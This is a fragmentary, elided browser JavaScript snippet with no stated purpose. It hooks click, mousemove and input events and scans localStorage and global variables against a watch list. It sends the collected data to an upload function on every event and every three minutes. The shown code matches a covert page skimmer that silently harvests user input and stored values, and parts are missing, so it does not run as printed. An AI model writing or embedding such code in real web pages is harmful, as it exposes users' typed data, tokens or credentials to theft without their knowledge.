...
const eventTypesToWatch = ["click", "mousemove", "input"];
...
function getHashCode(obj, keysToWatch) {
  let keyString = '';
...
function collectGlobalVars(targetObject, varsContainer) {
  for (const key in targetObject) {
    if (keysToWatch.includes(key) && !(key in varsContainer)) {
      varsContainer[key] = targetObject[key];
    }
  }
}
...
function scanLocalStorageAndGlobalVars() {
  const targetData = {};
  ...
  collectGlobalVars(window, targetData);
  collectGlobalVars(jshookVars, targetData);
  return targetData;
}
async function uploadData(data) {
  const hashCode = getHashCode(data, keysToWatch);
...
function addEventListeners(targetObject) {
  eventTypesToWatch.forEach(eventType => {
    targetObject.addEventListener(eventType, event => {
      const targetData = {
        eventType: eventType,
        target: event.target,
        data: scanLocalStorageAndGlobalVars()
      };
      uploadData(targetData);
    });
  });
}
function handleDOMContentLoaded() {
  collectGlobalVars(window, globalVars);
  collectGlobalVars(jshookVars, globalVars);
  addEventListeners(window);
  setInterval(() => uploadData(scanLocalStorageAndGlobalVars()), 3 * 60 * 1000);
}
